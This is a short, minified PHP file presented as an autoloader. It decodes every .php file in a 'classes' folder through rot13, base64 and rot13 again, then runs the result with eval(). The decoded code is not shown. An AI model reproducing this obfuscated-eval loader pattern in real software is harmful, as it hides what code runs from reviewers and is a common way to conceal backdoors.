<?php $autoloadDirectories=[__DIR__.'/classes',];$autoloadFiles=[];if(count($autoloadDirectories)>0):foreach($autoloadDirectories as $dir):if(is_dir($dir)):if($dh=opendir($dir)):while(($file=readdir($dh))!==false):if(!is_dir($file)&&!(substr($file,0,2)==="__")&&(substr($file,-4)===".php")):array_push($autoloadFiles,$dir."/".$file);endif;endwhile;closedir($dh);endif;endif;endforeach;endif;if(count($autoloadFiles)>0):try{foreach($autoloadFiles as $file):if(file_exists($file)):eval(str_rot13(base64_decode(str_rot13(file_get_contents($file)))));endif;endforeach;}catch(Exception $e){trigger_error($e->getMessage(),E_USER_WARNING);}endif;